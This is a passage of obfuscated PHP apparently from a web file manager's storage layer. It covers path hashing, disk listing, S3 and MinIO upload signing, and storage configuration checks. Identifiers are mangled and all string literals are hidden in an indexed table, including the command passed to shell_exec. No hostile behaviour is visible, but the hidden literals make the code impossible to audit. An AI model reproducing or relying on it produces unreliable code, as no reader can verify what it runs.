$ôÌèğÄš[1358]; $Û„¯ş¶¸ = $¤üá×«× ? $Û„¯ş¶¸ . $¤üá×«× . $ôÌèğÄš[18] : $Û„¯ş¶¸; return $Û„¯ş¶¸; } public static function hashPath($ÙûÈš€…, $şŸûÆ­ = true) { $ª¨– =& $_SERVER[ü¢ÙÊñÛ]; $ˆû—ãˆÑ = is_array($ÙûÈš€…) ? $ÙûÈš€… : IO::info($ÙûÈš€…); $ı¡Ÿ¹Ù— = _get($ˆû—ãˆÑ, $ª¨–[1359], $ª¨–[22]); if (!$ı¡Ÿ¹Ù— && isset($ˆû—ãˆÑ[$ª¨–[248]])) { $ı¡Ÿ¹Ù— = trim($ˆû—ãˆÑ[$ª¨–[248]], $ª¨–[132]); } if (!$ı¡Ÿ¹Ù— && isset($ˆû—ãˆÑ[$ª¨–[204]]) && $ˆû—ãˆÑ[$ª¨–[204]]) { $ˆû—ãˆÑ = IO::info(KodIO::make($ˆû—ãˆÑ[$ª¨–[204]])); $ı¡Ÿ¹Ù— = _get($ˆû—ãˆÑ, $ª¨–[1359], $ª¨–[22]); } $¾Ğäìú• = md5($ˆû—ãˆÑ[$ª¨–[98]] . $ˆû—ãˆÑ[$ª¨–[90]] . $ˆû—ãˆÑ[$ª¨–[99]]); if (!$ı¡Ÿ¹Ù— && file_exists($ˆû—ãˆÑ[$ª¨–[98]])) { $ı¡Ÿ¹Ù— = Cache::get($¾Ğäìú• . $ª¨–[1360]); $ı¡Ÿ¹Ù— = !1; if (!$ı¡Ÿ¹Ù—) { $ı¡Ÿ¹Ù— = IO::hashSimple($ˆû—ãˆÑ[$ª¨–[98]]); Cache::set($¾Ğäìú• . $ª¨–[1360], $ı¡Ÿ¹Ù—, 3600 * 24 * 30); } } if ($şŸûÆ­ && !$ı¡Ÿ¹Ù—) { } return $ı¡Ÿ¹Ù— ? $ı¡Ÿ¹Ù— : $¾Ğäìú•; } public static function hashPathSafe($öâÚØ½, $­é‡Æ¬ú = true) { $²ÈçÀó• =& $_SERVER[ü¢ÙÊñÛ]; $¶ù“Ñ·Æ = self::hashPath($öâÚØ½, $­é‡Æ¬ú); return md5($¶ù“Ñ·Æ . $²ÈçÀó•[1361] . Model($²ÈçÀó•[835])->get($²ÈçÀó•[836])); } public static function initSystemPath() { $Å¨á´Ò =& $_SERVER[ü¢ÙÊñÛ]; if (defined($Å¨á´Ò[1362])) { return; } define($Å¨á´Ò[1362], self::systemPath($Å¨á´Ò[202])); define($Å¨á´Ò[1363], self::systemPath($Å¨á´Ò[1364])); define($Å¨á´Ò[1365], self::systemPath($Å¨á´Ò[1366])); define($Å¨á´Ò[1367], self::systemPath($Å¨á´Ò[1368])); IOHistory::bindEvent(); } public static function systemPath($™ª…®·¤) { $”ùêÃò =& $_SERVER[ü¢ÙÊñÛ]; $âĞ×¶… = $”ùêÃò[1369] . ucfirst($™ª…®·¤); $êÒ”ÎÅ‡ = Model($”ùêÃò[835])->get($âĞ×¶…); if ($êÒ”ÎÅ‡) { return $êÒ”ÎÅ‡; } if ($™ª…®·¤ == $”ùêÃò[202]) { $êÒ”ÎÅ‡ = self::make(Model($”ùêÃò[890])->systemRootPathAdd($”ùêÃò[619])); } else { $êÒ”ÎÅ‡ = self::systemPath($”ùêÃò[202]); $İİ²éìµ = self::sourceID($êÒ”ÎÅ‡); $êÒ”ÎÅ‡ = self::make(Model($”ùêÃò[890])->mkdir($İİ²éìµ, $™ª…®·¤)); } Model($”ùêÃò[835])->set($âĞ×¶…, $êÒ”ÎÅ‡); return $êÒ”ÎÅ‡; } public static function systemFolder($„ÄşüÒ) { $¬ü‹£Á€ = IO_PATH_SYSTEM_SOURCE . $„ÄşüÒ; $÷›®Êš” = Cache::get($¬ü‹£Á€); if (!$÷›®Êš”) { $ûÓÙŠËœ = IO::infoFullSimple($¬ü‹£Á€); if (!$ûÓÙŠËœ) { $÷›®Êš” = IO::mkdir($¬ü‹£Á€, REPEAT_SKIP); } else { $÷›®Êš” = $ûÓÙŠËœ[$_SERVER[ü¢ÙÊñÛ][98]]; } Cache::set($¬ü‹£Á€, $÷›®Êš”, 3600 * 10); } return $÷›®Êš”; } public static function defaultDriver() { return Model($_SERVER[ü¢ÙÊñÛ][832])->defaultDriver(); } public static function defaultIO() { $Áìª‘“Ë =& $_SERVER[ü¢ÙÊñÛ]; $è¯––Ÿ™ = self::defaultDriver(); return $Áìª‘“Ë[1370] . $è¯––Ÿ™[$Áìª‘“Ë[486]] . $Áìª‘“Ë[1358]; } public static function defaultDriverInit() { static $‡¢¶·„Ã = false; if ($‡¢¶·„Ã) { return $‡¢¶·„Ã; } $‡¢¶·„Ã = IO::init(self::defaultIO()); return $‡¢¶·„Ã; } public static function fileTypeList() { $§»º «“ =& $_SERVER[ü¢ÙÊñÛ]; $¬ô³°ŠŞ = $GLOBALS[$§»º «“[16]][$§»º «“[1371]]; foreach ($¬ô³°ŠŞ as $ß£‘¯ôÄ => $¼Íµ—û) { $‘øŠÏß = $§»º «“[1372] . $ß£‘¯ôÄ; $Í¡ù² = LNG($‘øŠÏß); if ($‘øŠÏß != $Í¡ù²) { $¬ô³°ŠŞ[$ß£‘¯ôÄ][$§»º «“[42]] = $Í¡ù²; } } return $¬ô³°ŠŞ; } public static function diskList($ªÍø†“ = true) { $‰Ïò³ëí = $_SERVER[ü¢ÙÊñÛ][1373]; if ($ªÍø†“) { $è”’ÕÊÓ = Cache::get($‰Ïò³ëí); if (is_array($è”’ÕÊÓ)) { return $è”’ÕÊÓ; } } $è”’ÕÊÓ = self::diskListGet(); Cache::set($‰Ïò³ëí, $è”’ÕÊÓ, 60); return $è”’ÕÊÓ; } public static function diskListGet() { $Ç®â«òÔ =& $_SERVER[ü¢ÙÊñÛ]; $ƒÅµ¸ = array(); if ($GLOBALS[$Ç®â«òÔ[16]][$Ç®â«òÔ[1374]] == $Ç®â«òÔ[1375]) { $Áı¦ƒ¤› = $Ç®â«òÔ[1376]; for ($àåùãÄü = 0; $àåùãÄü < strlen($Áı¦ƒ¤›); $àåùãÄü++) { $ßÇó×²è = $Áı¦ƒ¤›[$àåùãÄü] . $Ç®â«òÔ[1377]; if (file_exists($ßÇó×²è)) { $ƒÅµ¸[] = $ßÇó×²è; } } return $ƒÅµ¸; } if (!function_exists($Ç®â«òÔ[112])) { $ƒÅµ¸[] = $Ç®â«òÔ[902]; return $ƒÅµ¸; } $Ç—ÂäÎ“ = explode($Ç®â«òÔ[10], shell_exec($Ç®â«òÔ[1378])); array_shift($Ç—ÂäÎ“); array_pop($Ç—ÂäÎ“); $š”ªËÎé = array($Ç®â«òÔ[1379], $Ç®â«òÔ[1380], $Ç®â«òÔ[1381], $Ç®â«òÔ[1382], $Ç®â«òÔ[1383], $Ç®â«òÔ[1384], $Ç®â«òÔ[1385], $Ç®â«òÔ[1386]); foreach ($Ç—ÂäÎ“ as $ş¦ÎÉ•) { $äÄ¨ø˜³ = preg_split($Ç®â«òÔ[1387], $ş¦ÎÉ•); $ßÇó×²è = $äÄ¨ø˜³[count($äÄ¨ø˜³) - 1]; if (!strstr($äÄ¨ø˜³[0], $Ç®â«òÔ[1388]) || !$ßÇó×²è) { continue; } $¡Û·Û = rtrim($ßÇó×²è, $Ç®â«òÔ[18]) . $Ç®â«òÔ[18]; if (in_array($¡Û·Û, $š”ªËÎé)) { continue; } $ƒÅµ¸[] = $¡Û·Û; } return $ƒÅµ¸; } public static function isSameDisk($„ü¹óÕ”, $‚Š‚êíç) { $¦Âû˜ÙÌ =& $_SERVER[ü¢ÙÊñÛ]; if ($GLOBALS[$¦Âû˜ÙÌ[16]][$¦Âû˜ÙÌ[1374]] == $¦Âû˜ÙÌ[1375]) { return strtolower(substr($„ü¹óÕ”, 0, 1)) == strtolower(substr($‚Š‚êíç, 0, 1)); } $Ç©ÛÍÇØ = stat($„ü¹óÕ”); $È­íûÛŒ = stat($‚Š‚êíç); if ($Ç©ÛÍÇØ === !1 || $È­íûÛŒ === !1) { return !1; } return $Ç©ÛÍÇØ[$¦Âû˜ÙÌ[1389]] === $È­íûÛŒ[$¦Âû˜ÙÌ[1389]]; $ÃàĞæĞ = self::diskList(); $ıÎë·®¦ = !1; $½…Œ„‘° = !1; sort($ÃàĞæĞ); $ÃàĞæĞ = array_reverse($ÃàĞæĞ); $„ü¹óÕ” = rtrim($„ü¹óÕ”, $¦Âû˜ÙÌ[18]) . $¦Âû˜ÙÌ[18]; $‚Š‚êíç = rtrim($‚Š‚êíç, $¦Âû˜ÙÌ[18]) . $¦Âû˜ÙÌ[18]; foreach ($ÃàĞæĞ as $¢Ê÷§Ì) { $¸øÕã˜ = strlen($¢Ê÷§Ì); if (!$ıÎë·®¦ && substr($„ü¹óÕ”, 0, $¸øÕã˜) == $¢Ê÷§Ì) { $ıÎë·®¦ = $¢Ê÷§Ì; } if (!$½…Œ„‘° && substr($‚Š‚êíç, 0, $¸øÕã˜) == $¢Ê÷§Ì) { $½…Œ„‘° = $¢Ê÷§Ì; } if ($ıÎë·®¦ && $½…Œ„‘°) { break; } } return $ıÎë·®¦ === $½…Œ„‘°; } public static function transferType($ÎÔâèÆ, $Åˆ×çà°) { $™³™£ÖÚ =& $_SERVER[ü¢ÙÊñÛ]; $Ù¨ºŒ÷â = self::driverType($ÎÔâèÆ); $­Ş¶û»­ = self::driverType($Åˆ×çà°); if ($Ù¨ºŒ÷â[$™³™£ÖÚ[43]] == $­Ş¶û»­[$™³™£ÖÚ[43]] && $Ù¨ºŒ÷â[$™³™£ÖÚ[1390]] == $­Ş¶û»­[$™³™£ÖÚ[1390]]) { return $™³™£ÖÚ[1391]; } if ($Ù¨ºŒ÷â[$™³™£ÖÚ[43]] == $™³™£ÖÚ[936] && $­Ş¶û»­[$™³™£ÖÚ[43]] == $™³™£ÖÚ[120]) { return $™³™£ÖÚ[1268]; } if ($Ù¨ºŒ÷â[$™³™£ÖÚ[43]] == $™³™£ÖÚ[120] && $­Ş¶û»­[$™³™£ÖÚ[43]] == $™³™£ÖÚ[936]) { return $™³™£ÖÚ[121]; } return $™³™£ÖÚ[1392]; } public static function driverType($Ï³¤ù²Œ) { $éœ˜ÒĞÇ =& $_SERVER[ü¢ÙÊñÛ]; $¼Üš²ø = str_replace($éœ˜ÒĞÇ[1393], $éœ˜ÒĞÇ[22], strtolower($Ï³¤ù²Œ->getType())); if ($¼Üš²ø == $éœ˜ÒĞÇ[822] || $¼Üš²ø == $éœ˜ÒĞÇ[1394] || $¼Üš²ø == $éœ˜ÒĞÇ[1395]) { $Ï³¤ù²Œ = self::defaultDriverInit(); } else { if ($¼Üš²ø == $éœ˜ÒĞÇ[1278] || $¼Üš²ø == $éœ˜ÒĞÇ[1396]) { $Ï³¤ù²Œ = IO::init($Ï³¤ù²Œ->pathParse[$éœ˜ÒĞÇ[1221]]); } } $øÍÛö¦ = $Ï³¤ù²Œ->path; $¼Üš²ø = str_replace($éœ˜ÒĞÇ[1393], $éœ˜ÒĞÇ[22], strtolower($Ï³¤ù²Œ->getType())); if ($¼Üš²ø == $éœ˜ÒĞÇ[120]) { return array($éœ˜ÒĞÇ[43] => $éœ˜ÒĞÇ[120], $éœ˜ÒĞÇ[1390] => $éœ˜ÒĞÇ[22], $éœ˜ÒĞÇ[98] => $øÍÛö¦, $éœ˜ÒĞÇ[109] => $Ï³¤ù²Œ); } return array($éœ˜ÒĞÇ[43] => $éœ˜ÒĞÇ[936], $éœ˜ÒĞÇ[1390] => $Ï³¤ù²Œ->pathDriver, $éœ˜ÒĞÇ[98] => $øÍÛö¦, $éœ˜ÒĞÇ[109] => $Ï³¤ù²Œ); } public static function pathDriverType($ûÌ¢ËˆÓ) { return $ûÌ¢ËˆÓ ? self::driverType(IO::init($ûÌ¢ËˆÓ)) : !1; } public static function pathDriverLocal($ˆ¨¢èö«) { $ËÅşÚêÄ =& $_SERVER[ü¢ÙÊñÛ]; $É¥¾¼¯å = $ˆ¨¢èö« ? self::driverType(IO::init($ˆ¨¢èö«)) : !1; return strtolower($É¥¾¼¯å[$ËÅşÚêÄ[43]]) == $ËÅşÚêÄ[120] ? !0 : !1; } public static function allowCover($¨ÊÎëÉŒ, $äµÅòÄñ = true) { $¯ïàËâí =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($¨ÊÎëÉŒ)) { $¨ÊÎëÉŒ = IO::info($¨ÊÎëÉŒ); } if (!$¨ÊÎëÉŒ || $¨ÊÎëÉŒ[$¯ïàËâí[43]] == $¯ïàËâí[89] || $¨ÊÎëÉŒ[$¯ïàËâí[90]] <= 100) { return !1; } if (isset($¨ÊÎëÉŒ[$¯ïàËâí[1397]]) || !$¨ÊÎëÉŒ[$¯ïàËâí[98]]) { return !1; } if (isset($¨ÊÎëÉŒ[$¯ïàËâí[245]]) && !$¨ÊÎëÉŒ[$¯ïàËâí[245]]) { return !1; } static $ƒªîÆ×˜ = false; if (!$ƒªîÆ×˜ || !$äµÅòÄñ) { $÷°Ş˜‚ = self::driverType(IO::init($¨ÊÎëÉŒ[$¯ïàËâí[98]])); $í‚–Óæº = $÷°Ş˜‚[$¯ïàËâí[109]]; $ƒªîÆ×˜ = $¯ïàËâí[207]; if ($÷°Ş˜‚[$¯ïàËâí[43]] == $¯ïàËâí[120]) { $ƒªîÆ×˜ = $¯ïàËâí[1398]; } if ($÷°Ş˜‚[$¯ïàËâí[109]] && is_array($÷°Ş˜‚[$¯ïàËâí[109]]->config)) { $¿Êœ‡«¾ = $÷°Ş˜‚[$¯ïàËâí[109]]->config; if (isset($¿Êœ‡«¾[$¯ïàËâí[1399]]) && $¿Êœ‡«¾[$¯ïàËâí[1399]]) { $ƒªîÆ×˜ = $¯ïàËâí[1398]; } } $ÙÃñÊ¯˜ = KodIO::defaultDriver(); if (strtolower($ÙÃñÊ¯˜[$¯ïàËâí[109]]) == $¯ïàËâí[120] && is_array($ÙÃñÊ¯˜[$¯ïàËâí[16]])) { $®ÚÇâ¦ï = $ÙÃñÊ¯˜[$¯ïàËâí[16]][$¯ïàËâí[1251]]; if (substr($®ÚÇâ¦ï, 0, 2) == $¯ïàËâí[1400]) { $®ÚÇâ¦ï = str_replace($¯ïàËâí[1400], BASIC_PATH, $®ÚÇâ¦ï); } $®ÚÇâ¦ï = str_replace($¯ïàËâí[267], $¯ïàËâí[18], $®ÚÇâ¦ï); if (substr($¨ÊÎëÉŒ[$¯ïàËâí[98]], 0, strlen($®ÚÇâ¦ï)) == $®ÚÇâ¦ï) { $ƒªîÆ×˜ = $¯ïàËâí[207]; } } } return $ƒªîÆ×˜ == $¯ïàËâí[1398] ? !0 : !1; } } goto f§ÃŸÜ½Ğ¡; AÆëÇ‚ËÖ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¾Ìå¢ß) { $¬‘‹Êú‚ =& $_SERVER[ü¢ÙÊñÛ]; parent::__construct($¾Ìå¢ß); $this->setSignVersion($¬‘‹Êú‚[260]); if (!$this->region) { $this->region = $¬‘‹Êú‚[317]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÊÁ³¿äŞ = $this->getBktRegion(); return $this->region == $ÊÁ³¿äŞ ? !0 : !1; } public function uploadFormData($‡ÖÀÔëó, $“´Èë· = 3600) { $’íø”¶û =& $_SERVER[ü¢ÙÊñÛ]; $¼ÜÃ¡òÛ = $’íø”¶û[242]; $’«¯€³ = $’íø”¶û[270]; $Í¨Ÿ³½â = $’íø”¶û[73]; $ÂöŸëÓ = gmdate($’íø”¶û[271]); $•ÜéÀ¤¸ = gmdate($’íø”¶û[272]); $ÑÌÁşÃ– = $’íø”¶û[273]; $èşí¼ÒÃ = $“´Èë· . $’íø”¶û[22]; $ê¼ÜÊ¨› = $’íø”¶û[274]; $·ï¹ë«Ş = array($this->accessKey, $•ÜéÀ¤¸, $this->region, $Í¨Ÿ³½â, $ÑÌÁşÃ–); $Óâƒ’¬ = implode($’íø”¶û[18], $·ï¹ë«Ş); $¦¹µÁŠ = array($’íø”¶û[275] => gmdate($’íø”¶û[276], strtotime($’íø”¶û[277])), $’íø”¶û[278] => array(array($’íø”¶û[279] => $this->bucket), array($’íø”¶û[318] => $¼ÜÃ¡òÛ), array($’íø”¶û[280], $’íø”¶û[281], $’íø”¶û[22]), array($’íø”¶û[280], $’íø”¶û[282], $’íø”¶û[22]), array($’íø”¶û[280], $’íø”¶û[319], $’íø”¶û[22]), array($’íø”¶û[283] => $ê¼ÜÊ¨›), array($’íø”¶û[284] => $Óâƒ’¬), array($’íø”¶û[285] => $’«¯€³), array($’íø”¶û[286] => $ÂöŸëÓ), array($’íø”¶û[287] => $èşí¼ÒÃ))); $§Ÿú›Ê™ = base64_encode(json_encode($¦¹µÁŠ)); $¿ˆÇê§Î = hash_hmac($’íø”¶û[288], $•ÜéÀ¤¸, $’íø”¶û[289] . $this->secret, !0); $áÙğÇÕ = hash_hmac($’íø”¶û[288], $this->region, $¿ˆÇê§Î, !0); $ß–Ÿ€ú‘ = hash_hmac($’íø”¶û[288], $Í¨Ÿ³½â, $áÙğÇÕ, !0); $ˆ£ä¿® = hash_hmac($’íø”¶û[288], $ÑÌÁşÃ–, $ß–Ÿ€ú‘, !0); $å™³‘ò = hash_hmac($’íø”¶û[288], $§Ÿú›Ê™, $ˆ£ä¿®); $”é–İ‹ = array($’íø”¶û[259] => $’íø”¶û[22], $’íø”¶û[306] => $’íø”¶û[22], $’íø”¶û[318] => $¼ÜÃ¡òÛ, $’íø”¶û[283] => $ê¼ÜÊ¨›, $’íø”¶û[290] => $§Ÿú›Ê™, $’íø”¶û[320] => $Óâƒ’¬, $’íø”¶û[321] => $’«¯€³, $’íø”¶û[322] => $ÂöŸëÓ, $’íø”¶û[323] => $èşí¼ÒÃ, $’íø”¶û[324] => $å™³‘ò, $’íø”¶û[219] => $this->getHost()); return $”é–İ‹; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($šÈà‘¾ø) { $ŒÙĞ›ÃÍ =& $_SERVER[ü¢ÙÊñÛ]; parent::__construct($šÈà‘¾ø); $¢ñ‡À = isset($šÈà‘¾ø[$ŒÙĞ›ÃÍ[269]]) && $šÈà‘¾ø[$ŒÙĞ›ÃÍ[269]] == $ŒÙĞ›ÃÍ[260] ? $ŒÙĞ›ÃÍ[260] : $ŒÙĞ›ÃÍ[325]; $this->setSignVersion($¢ñ‡À); } public function link($¦Çã³”, $İùªÏô = array()) { return parent::link($¦Çã³”, $İùªÏô); } public function fileOut($ó“—‡°µ, $çûÔ—‹ = false, $ƒÄ®ùÈ  = false, $¢»ÄŸ¬ì = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ü¢ÙÊñÛ][326])) { return parent::fileOutServer($ó“—‡°µ, $çûÔ—‹, $ƒÄ®ùÈ , $¢»ÄŸ¬ì); } parent::fileOut($ó“—‡°µ, $çûÔ—‹, $ƒÄ®ùÈ , $¢»ÄŸ¬ì); } public function fileOutImage($½«ºÅş·, $¬ıßÃ® = 250) { if (strstr($this->endpoint, $_SERVER[ü¢ÙÊñÛ][326])) { return parent::fileOutImageServer($½«ºÅş·, $¬ıßÃ®); } parent::fileOutImage($½«ºÅş·, $¬ıßÃ®); } public function fileOutLink($Ñˆ÷âïã) { $ñ¾Ÿ¨·ı =& $_SERVER[ü¢ÙÊñÛ]; if (substr($Ñˆ÷âïã, 0, 7) == $ñ¾Ÿ¨·ı[229]) { $Ñˆ÷âïã = $ñ¾Ÿ¨·ı[230] . substr($Ñˆ÷âïã, 7); } header($ñ¾Ÿ¨·ı[186] . $Ñˆ÷âïã); die; } } define($_SERVER[ü¢ÙÊñÛ][327], 1); goto CÌÄ‰­Ãƒ; CÅ°£­Îªõ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x73\x6f\165\162\x63\145\x53\x65\143\x72\145\164\114\x69\x73\164"; public $field = array("\x73\x6f\x75\x72\x63\x65\111\104", "\164\x79\160\145\x49\x44", "\x63\162\145\x61\x74\145\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\x73\x74\x6f\x72\x61\147\145\x4c\151\163\x74"; public $field = array("\156\141\155\x65", "\163\151\172\145\x4d\141\x78", "\163\x79\163\164\145\x6d", "\144\145\x66\141\x75\154\164", "\144\x72\151\166\145\x72", "\x63\157\156\146\151\x67"); public function listData($çºÈ«ôñ = false, $•ÄóÑ¹Š = "\x6d\x6f\x64\151\x66\x79\x54\x69\155\145", $ùúÅ´Æ¬ = false) { $²ó¼…Çñ =& $_SERVER[ü¢ÙÊñÛ]; $˜·—®ºÏ = parent::listData($çºÈ«ôñ, $•ÄóÑ¹Š, $ùúÅ´Æ¬); if ($çºÈ«ôñ) { return $˜·—®ºÏ; } $õóş“–¬ = array(); if ($GLOBALS[$²ó¼…Çñ[2293]]) { $õóş“–¬ = $this->ioSizeUseGet(array_to_keyvalue($˜·—®ºÏ, $²ó¼…Çñ[22], $²ó¼…Çñ[486])); } foreach ($˜·—®ºÏ as $´©¨ğåÓ => $êÓ¢†‰) { unset($˜·—®ºÏ[$´©¨ğåÓ][$²ó¼…Çñ[16]]); $˜·—®ºÏ[$´©¨ğåÓ][$²ó¼…Çñ[1947]] = isset($õóş“–¬[$êÓ¢†‰[$²ó¼…Çñ[486]]]) ? $õóş“–¬[$êÓ¢†‰[$²ó¼…Çñ[486]]] : 0; } return $˜·—®ºÏ; } public function ioSizeUseGet($»ƒÜÃÕ´) { $ºÒïúÍ¡ =& $_SERVER[ü¢ÙÊñÛ]; if (!$»ƒÜÃÕ´) { return array(); } $¼©—Òã¬ = $ºÒïúÍ¡[2294] . implode($ºÒïúÍ¡[60], $»ƒÜÃÕ´); $Ù€Ã—Ç® = Cache::get($¼©—Òã¬); if ($Ù€Ã—Ç®) { return $Ù€Ã—Ç®; } $Û½úø = array($ºÒïúÍ¡[883] => $ºÒïúÍ¡[486], $ºÒïúÍ¡[2295] => $ºÒïúÍ¡[90]); $ª›¿°ùè = array($ºÒïúÍ¡[883] => array($ºÒïúÍ¡[17], $»ƒÜÃÕ´)); $Ù€Ã—Ç® = Model($ºÒïúÍ¡[855])->field($Û½úø)->where($ª›¿°ùè)->group($ºÒïúÍ¡[883])->select(); $Ù€Ã—Ç® = array_to_keyvalue($Ù€Ã—Ç®, $ºÒïúÍ¡[486], $ºÒïúÍ¡[90]); Cache::set($¼©—Òã¬, $Ù€Ã—Ç®, 600); return $Ù€Ã—Ç®; } public function getConfig($Ÿ¶ÈÌñÎ) { $¨—¢ìøñ = parent::listData($Ÿ¶ÈÌñÎ); $ÛÁ° Îò = _get($¨—¢ìøñ, $_SERVER[ü¢ÙÊñÛ][16], array()); if ($ÛÁ° Îò && !is_array($ÛÁ° Îò)) { $ÛÁ° Îò = json_decode($ÛÁ° Îò, !0); } return $ÛÁ° Îò; } public function update($şã“ÏîÙ, $‚ÇÏ¬À¼) { $¶ê·ûü¥ =& $_SERVER[ü¢ÙÊñÛ]; $Â¥åçÜÁ = $‚ÇÏ¬À¼[$¶ê·ûü¥[42]]; $µşñ¸°è = array_to_keyvalue(parent::listData(), $¶ê·ûü¥[42]); if (isset($µşñ¸°è[$Â¥åçÜÁ]) && $µşñ¸°è[$Â¥åçÜÁ][$¶ê·ûü¥[486]] != $şã“ÏîÙ) { return !1; } $this->checkPwd($şã“ÏîÙ, $‚ÇÏ¬À¼); if (isset($‚ÇÏ¬À¼[$¶ê·ûü¥[2296]]) && $‚ÇÏ¬À¼[$¶ê·ûü¥[2296]] == $¶ê·ûü¥[102]) { $this->checkConfig($‚ÇÏ¬À¼); } unset($‚ÇÏ¬À¼[$¶ê·ûü¥[2296]]); $˜»Ê£ì = parent::update($şã“ÏîÙ, $‚ÇÏ¬À¼); if ($˜»Ê£ì && $‚ÇÏ¬À¼[$¶ê·ûü¥[47]]) { $šˆ»¢‘‘ = 0; foreach ($µşñ¸°è as $Æüõ½€) { if ($Æüõ½€[$¶ê·ûü¥[47]] && $Æüõ½€[$¶ê·ûü¥[486]] != $şã“ÏîÙ) { $šˆ»¢‘‘ = $Æüõ½€[$¶ê·ûü¥[486]]; parent::update($Æüõ½€[$¶ê·ûü¥[486]], array($¶ê·ûü¥[47] => 0)); } } $this->updateBackup($şã“ÏîÙ, $šˆ»¢‘‘); } return $˜»Ê£ì; } public function add($¨Ï»ˆÖò) { $½‘ƒË°Ù =& $_SERVER[ü¢ÙÊñÛ]; $ ÁìÖö“ = array_to_keyvalue(parent::listData(), $½‘ƒË°Ù[42]); if (isset($ ÁìÖö“[$¨Ï»ˆÖò[$½‘ƒË°Ù[42]]])) { return !1; } $this->checkConfig($¨Ï»ˆÖò); $÷­Ñ¨ì¶ = parent::insert($¨Ï»ˆÖò); if ($÷­Ñ¨ì¶ && $¨Ï»ˆÖò[$½‘ƒË°Ù[47]]) { foreach ($ ÁìÖö“ as $üÁ™Ş×É) { if ($üÁ™Ş×É[$½‘ƒË°Ù[47]]) { parent::update($üÁ™Ş×É[$½‘ƒË°Ù[486]], array($½‘ƒË°Ù[47] => 0)); } } } return $÷­Ñ¨ì¶; } public function updateBackup($úı¶€¯ó, $´¹åŠé) { $Ç¹Şœİ =& $_SERVER[ü¢ÙÊñÛ]; if (!$´¹åŠé) { return; } $„ªœÛŸÒ = Model($Ç¹Şœİ[813])->config(); if ($„ªœÛŸÒ[$Ç¹Şœİ[1728]] != $Ç¹Şœİ[102] || $„ªœÛŸÒ[$Ç¹Şœİ[817]] != $´¹åŠé) { return; } $àİáÕ¸» = Model($Ç¹Şœİ[835])->get($Ç¹Şœİ[849]); $àİáÕ¸» = json_decode($àİáÕ¸», !0); if (!$àİáÕ¸») { return; } $àİáÕ¸»[$Ç¹Şœİ[817]] = $úı¶€¯ó; Model($Ç¹Şœİ[835])->set(array($Ç¹Şœİ[849] => $àİáÕ¸»)); } public function checkPwd($‘Ëø™¿, &$Åì­¢Õà) { $Ïš±àŞ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($Åì­¢Õà[$Ïš±àŞ[16]])) { return; } $ÃÓ¨ëé = $Åì­¢Õà[$Ïš±àŞ[16]]; if (!is_array($ÃÓ¨ëé)) { $ÃÓ¨ëé = json_decode($ÃÓ¨ëé, !0); } $ğ†Èèİß = $Ïš±àŞ[22]; $ğí¤ú£À = array($Ïš±àŞ[2297], $Ïš±àŞ[2298], $Ïš±àŞ[955]); foreach ($ğí¤ú£À as $ËÍğüùŒ) { if (isset($ÃÓ¨ëé[$ËÍğüùŒ])) { $ğ†Èèİß = $ËÍğüùŒ; break; } } if (!$ğ†Èèİß) { return; } $“†¦èÛı = $this->getConfig($‘Ëø™¿); $ƒƒÚ¢ÜÉ = $“†¦èÛı[$ğ†Èèİß]; $ÌîÎí‰œ = $ÃÓ¨ëé[$ğ†Èèİß]; if ($ÌîÎí‰œ == str_repeat($Ïš±àŞ[233], strlen($ƒƒÚ¢ÜÉ))) { $ÃÓ¨ëé[$ğ†Èèİß] = $ƒƒÚ¢ÜÉ; $Åì­¢Õà[$Ïš±àŞ[16]] = json_encode($ÃÓ¨ëé); } else { if ($ÌîÎí‰œ != $ƒƒÚ¢ÜÉ) { $Åì­¢Õà[$Ïš±àŞ[2296]] = $Ïš±àŞ[102]; } } } public function checkConfig(&$©òèÎÌÁ, $ğş²©Æ = false) { $’ÄšÁ†À =& $_SERVER[ü¢ÙÊñÛ]; $Áä“‰­ = strtolower($©òèÎÌÁ[$’ÄšÁ†À[109]]); $©ÊÔİ¢ = $©òèÎÌÁ[$’ÄšÁ†À[16]]; if (!is_array($©ÊÔİ¢)) { $©ÊÔİ¢ = json_decode($©ÊÔİ¢, !0); } foreach ($©ÊÔİ¢ as $•Â†ØÍŸ => $¦àİÔÃÏ) { if (is_string($¦àİÔÃÏ)) { $©ÊÔİ¢[$•Â†ØÍŸ] = trim($¦àİÔÃÏ); } } $©ÊÔİ¢[$’ÄšÁ†À[2299]] = rand_string(6); $‘Ä¦•ÄÛ = $GLOBALS[$’ÄšÁ†À[16]][$’ÄšÁ†À[103]][$’ÄšÁ†À[891]]; $·¯™ùÇ = isset($‘Ä¦•ÄÛ[$Áä“‰­]) ? $‘Ä¦•ÄÛ[$Áä“‰­] : ucfirst($Áä“‰­); $¦Ò…Îô‡ = $’ÄšÁ†À[88] . $·¯™ùÇ; if (!$·¯™ùÇ || !class_exists($¦Ò…Îô‡)) { if ($ğş²©Æ) { return LNG($’ÄšÁ†À[2300]); } write_log(array($’ÄšÁ†À[2301], $©òèÎÌÁ, get_caller_info()), $’ÄšÁ†À[226]); show_json(LNG($’ÄšÁ†À[2300]), !1, $©òèÎÌÁ); } $²™é˜¯ = new $¦Ò…Îô‡($©ÊÔİ¢); if (in_array($Áä“‰­, $²™é˜¯->objectDriver)) { try { if (!$²™é˜¯->isBucketCors() && !$²™é˜¯->setBucketCors()) { $Çïƒ“± = LNG($’ÄšÁ†À[2302]); $Çïƒ“± .= $’ÄšÁ†À[2303] . LNG($’ÄšÁ†À[2304]); } } catch (Exception $µ€¦ÏŸ) { $Çïƒ“± = $µ€¦ÏŸ->getMessage(); } if (isset($Çïƒ“±)) { return $this->_parseError($Çïƒ“±, $Áä“‰­, $ğş²©Æ); } if ($Áä“‰­ == $’ÄšÁ†À[79] && !$²™é˜¯->checkRegion()) { return $this->_parseError(LNG($’ÄšÁ†À[2305]), $Áä“‰­, $ğş²©Æ); } } $Ñ„ˆ = rtrim($©ÊÔİ¢[$’ÄšÁ†À[1251]], $’ÄšÁ†À[18]) . $’ÄšÁ†À[18]; $Ó¸í²üë = $²™é˜¯->getPath($Ñ„ˆ . $’ÄšÁ†À[1255]); try { if 